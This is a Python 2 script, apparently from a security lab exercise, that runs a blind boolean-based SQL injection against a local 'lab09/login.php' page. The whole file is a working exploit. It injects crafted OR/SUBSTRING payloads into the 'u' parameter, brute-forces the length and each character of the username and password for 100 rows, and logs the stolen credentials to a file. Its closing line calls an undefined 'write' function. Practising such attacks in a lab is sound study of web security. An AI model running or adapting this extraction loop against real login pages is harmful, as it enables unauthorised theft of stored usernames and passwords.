import subprocess
import urllib
import string
import datetime
from itertools import cycle

file= open("logs.txt","w+")
file.write('START : ' + str(datetime.datetime.now())+'\n')
iterator=cycle(['username','password'])

############### Loop to get the 100 rows of username/password tuple ##############################
for row in xrange(1,101):
	file.write(str(row) + "    ")
###################### Loop to switch between username and password for the substring argument ###################	
	for iter in xrange(0,2):
		field=iterator.next()
		size = 0;
#################### Loop to find the size of the field #############################		
		while size<= 100:
			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(size) + "--%20"
			f = urllib.urlopen(request)
			response = f.read()
			#if there is a cat in the output html it means that we got the right size 
			if (response.find('cat.JPG')!=-1): 		
				break
			size+=1	
		word=""
#################### Loop to find to go from the first character to the last one (based on previously found size)		
		for pos in xrange(1,size+1):
###################### Loop to find a character, uses the chr() function that returns an ascii character 
			for c in xrange(0,128):
				request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20"+ str(row) +"%20AND%20SUBSTRING(" + str(field) + ","+ str(pos) +",1)%20=%20%27" + chr(c) + "%27%20--%20" 
				f = urllib.urlopen(request)
				response = f.read()
				if (response.find('cat.JPG')!=-1): 
					word += chr(c)
					break	
		file.write(word)
		file.write("     ")
	file.write("\n")
write('END : ' + str(datetime.datetime.now())+'\n')	
file.close()		

